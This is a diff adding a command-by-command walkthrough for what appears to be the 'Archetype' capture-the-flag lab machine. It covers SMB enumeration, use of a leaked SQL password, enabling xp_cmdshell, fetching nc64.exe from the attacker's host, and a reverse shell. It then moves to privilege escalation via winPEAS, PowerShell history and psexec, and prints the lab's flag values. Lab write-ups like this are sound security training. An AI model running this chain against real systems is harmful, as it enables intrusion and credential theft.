@@ -1,0 +1,61 @@
+Archetype Machine
+
+nmap -sV -O {ip_addr}
+nmap --script smb-enum-shares.nse {ip_addr}
+smbclient \\\\{ip_addr}\\backups
+get prod.dtsConfig
+#Download Impacket 
+cd examples
+python3 mssqlclient.py ARCHETYPE\sql_svc@{ip_addr} -windows-auth
+Password:M3g4c0rp123 [Got from prod.dtsConfig]
+
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+EXEC master..xp_cmdshell 'whoami'
+
+
+#We need to place nc64.exe script in the windows system. We chose sql_svc user as it is a low previlige user and can be read and write files to it
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;ls"
+
+#In other terminal start netcat listener on port 443
+nc -lnvp 443
+
+#In other terminal start python server and host the nc64.exe script which is used to provide an interactive cmd.exe process on our listening port
+python3 -m http.server
+
+#Comeback to SQL terminal 
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{kali_tun_ip}/nc64.exe -outfile nc64.exe"
+
+
+#Executing the nc64.exe and binding with netcat port
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;.\nc64.exe -e cmd.exe {kali_tun_ip} 443"
+
+#We got an interactive cmd shell on netcat port. we can find the user flag on sql_svc Desktop
+
+more user.txt
+user.txt: 3e7b102e78218e935bf3f4951fec21a3
+
+#Windows Privilege escalation
+
+#For this windows privilege escalation we need another .exe file called winPEASx64.exe 
+
+#Download the file and host it on the same server 
+
+#in the netcat terminal
+wget http://{kali_tun_ip}/winPEASx64.exe -outfile winPEASx64.exe
+#Executing the file
+.\winPEASEx64.exe
+#C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt [This file has password for Administrator]
+
+#In another terminal execute the psexec.py script which is in the suite of impacket which is used for windows privilege escalation
+
+python3 psexec.py administrator@{ip_addr}
+
+Enter the Password
+
+#the root flag can be found on Desktop of administrator
+
+root.txt: b91ccec3305e98240082d4474b848528
+
